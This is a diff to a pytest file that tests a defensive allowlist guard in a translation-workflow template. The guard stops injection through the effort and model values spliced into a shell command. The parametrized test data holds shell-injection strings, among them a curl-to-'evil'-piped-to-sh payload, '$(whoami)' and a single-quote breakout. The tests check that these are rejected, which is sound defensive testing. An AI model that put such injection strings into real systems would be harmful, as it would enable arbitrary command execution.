@@ -262,9 +262,31 @@ def test_template_source_declares_the_seg_id_guard():
     # function (translatePrompt) -- i.e. before any shell command string is
     # ever constructed.
     segs_idx = raw.index("const SEGS = Array.isArray(args)")
-    guard_idx = raw.index("SEG_ID_RE")
+    # The guard DECLARATION (not merely a mention -- the #197 EFFORT/MODEL guard's
+    # comment references "SEG_ID_RE" earlier in the file), which must appear after
+    # SEGS is built and before the first prompt-builder.
+    guard_idx = raw.index("const SEG_ID_RE")
     translate_prompt_idx = raw.index("function translatePrompt(")
     assert segs_idx < guard_idx < translate_prompt_idx
+
+
+def test_template_source_declares_the_effort_model_guard():
+    # #197 -- the EFFORT/MODEL shell-splice values get the same defense-in-depth
+    # allowlist guard as SEG_ID_RE: substituted from a schema-validated profile
+    # but re-checked at the sink so a poisoned/hand-edited profile.yml (or a
+    # resume that skips Step 0) fails loudly rather than reaching a shell splice.
+    raw = MASS_TRANSLATE_TEMPLATE.read_text(encoding="utf-8")
+    assert "EFFORT_RE" in raw
+    assert "MODEL_RE" in raw
+    assert "Unsafe engine.effort" in raw
+    assert "Unsafe engine.model" in raw
+    # The guard must sit before the prompt-builders that splice EFFORT/MODEL
+    # into the codex_job.py shell command (translateDrivePrompt/reviewDrivePrompt).
+    effort_guard_idx = raw.index("EFFORT_RE")
+    model_guard_idx = raw.index("MODEL_RE")
+    drive_idx = raw.index("function translateDrivePrompt(")
+    assert effort_guard_idx < drive_idx
+    assert model_guard_idx < drive_idx
 
 
 def _wrap_for_execution(js_source: str) -> str:
@@ -318,12 +340,14 @@ function log(msg) { logLines.push(String(msg)); }
 """
 
 
-def instantiate_mass_translate(*, batch_agent_cap: int) -> str:
+def instantiate_mass_translate(*, batch_agent_cap: int, effort: str = "high", model: str = "") -> str:
     """Same one-time substitution contract every sibling test file
-    re-implements. `batch_agent_cap` is the only value these tests care
+    re-implements. `batch_agent_cap` is the value the SEG-guard tests care
     about -- deliberately set to 0 by the "safe id" tests below so the
     batch-too-large gate trips immediately AFTER the seg-id guard runs,
-    without ever needing a real agent()/pipeline() mock. {{RUN_ID}} (CONTRACT
+    without ever needing a real agent()/pipeline() mock. `effort`/`model`
+    default to a schema-valid pair (unaffecting the SEG tests) and are
+    overridden only by the #197 EFFORT/MODEL guard tests. {{RUN_ID}} (CONTRACT
     -1.2.0-reliability.md sec2, a NEW documented substitution token the
     1.2.0 reliability build added to this template) is substituted here with
     a stable, colon-free, allowlist-legal fixture value purely so the
@@ -342,13 +366,18 @@ def instantiate_mass_translate(*, batch_agent_cap: int) -> str:
     # SEG_ID-guard assertions never read its value; it only needs to be a valid
     # JS literal so the "no leftover {{...}}" assertion below stays meaningful.
     text = text.replace("{{CODEX_COMPANION_PATH_JSON}}", '"/fake/codex-companion.mjs"')
+    # #197 -- engine.effort/engine.model. Default to a schema-valid pair so the
+    # SEG-guard tests are unaffected; the #197 EFFORT/MODEL guard tests below
+    # override them with allowlist-violating values to prove the guard throws.
+    text = text.replace("{{EFFORT}}", effort)
+    text = text.replace("{{MODEL}}", model)
     assert "{{" not in text
     return text
 
 
-def run_guard_harness(tmp_path: Path, segs: list, batch_agent_cap: int = 0, timeout: int = 30):
+def run_guard_harness(tmp_path: Path, segs: list, batch_agent_cap: int = 0, timeout: int = 30, effort: str = "high", model: str = ""):
     assert NODE is not None, "node executable not found on PATH -- required to run this test file"
-    js_source = instantiate_mass_translate(batch_agent_cap=batch_agent_cap)
+    js_source = instantiate_mass_translate(batch_agent_cap=batch_agent_cap, effort=effort, model=model)
     wrapped = _wrap_for_execution(js_source)
     text = HARNESS_TEMPLATE.replace("__WRAPPED_SOURCE__", wrapped)
     text = text.replace("__SEGS_JSON__", json.dumps(segs))
@@ -404,6 +433,82 @@ def test_workflow_js_guard_rejects_non_string_element():
         proc = run_guard_harness(Path(tmp), [123])
         assert proc.returncode != 0
         assert "Unsafe segment id" in proc.stderr
+
+
+# ---------------------------------------------------------------------------
+# #197 Part 4: the EFFORT/MODEL defense-in-depth guard, executed for real.
+# EFFORT is spliced UNQUOTED into the codex_job.py dispatch shell command, so a
+# metacharacter-bearing value is a direct injection point; MODEL is single-
+# quoted, so a value containing a single quote is a breakout. Both must be
+# rejected at the sink even if profile.schema.json's Step 0 validation is
+# skipped (resume path / hand-edited profile.yml). Every value below forms a
+# valid JS double-quoted string literal (no raw newline / double-quote), so the
+# guard -- not a node parse error -- is what rejects it.
+# ---------------------------------------------------------------------------
+
+UNSAFE_EFFORTS = [
+    "high; touch pwned",
+    "high && curl http://evil/x | sh",
+    "$(whoami)",
+    "high|sh",
+    "HIGH",
+    "ultra",
+    "max",
+    "",
+    "high ",
+]
+
+# NOT "" -- empty is the valid unset sentinel, asserted to PASS below.
+UNSAFE_MODELS = [
+    "x'; touch pwned; echo '",
+    "a b",
+    "-rf",
+    "model;evil",
+    "'",
+    "a$(b)",
+    "a|b",
+]
+
+
+@pytestmark_node
+@pytest.mark.parametrize("bad_effort", UNSAFE_EFFORTS)
+def test_workflow_js_guard_throws_on_unsafe_effort(tmp_path, bad_effort):
+    # Safe seg id, so the EFFORT guard (which runs before SEGS is even built) is
+    # the only thing that can throw.
+    proc = run_guard_harness(tmp_path, ["seg01"], effort=bad_effort)
+    assert proc.returncode != 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    assert "Unsafe engine.effort" in proc.stderr
+    assert proc.stdout.strip() == ""
+
+
+@pytestmark_node
+@pytest.mark.parametrize("bad_model", UNSAFE_MODELS)
+def test_workflow_js_guard_throws_on_unsafe_model(tmp_path, bad_model):
+    proc = run_guard_harness(tmp_path, ["seg01"], model=bad_model)
+    assert proc.returncode != 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    assert "Unsafe engine.model" in proc.stderr
+    assert proc.stdout.strip() == ""
+
+
+@pytestmark_node
+@pytest.mark.parametrize("good_effort", ["low", "medium", "high", "xhigh"])
+def test_workflow_js_guard_passes_valid_effort(tmp_path, good_effort):
+    # batch_agent_cap=0 makes the next gate (batch-too-large) trip right after
+    # the guards, proving they did NOT throw for a valid tier.
+    proc = run_guard_harness(tmp_path, ["seg01"], batch_agent_cap=0, effort=good_effort)
+    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    out = json.loads(proc.stdout)
+    assert out["result"]["reason"] == "batch-too-large"
+
+
+@pytestmark_node
+@pytest.mark.parametrize("good_model", ["", "gpt-5.3-codex", "o3", "gpt-5.6-luna"])
+def test_workflow_js_guard_passes_valid_or_unset_model(tmp_path, good_model):
+    # "" is the valid unset sentinel; the others are allowlist-legal ids.
+    proc = run_guard_harness(tmp_path, ["seg01"], batch_agent_cap=0, model=good_model)
+    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    out = json.loads(proc.stdout)
+    assert out["result"]["reason"] == "batch-too-large"
 
 
 if __name__ == "__main__":
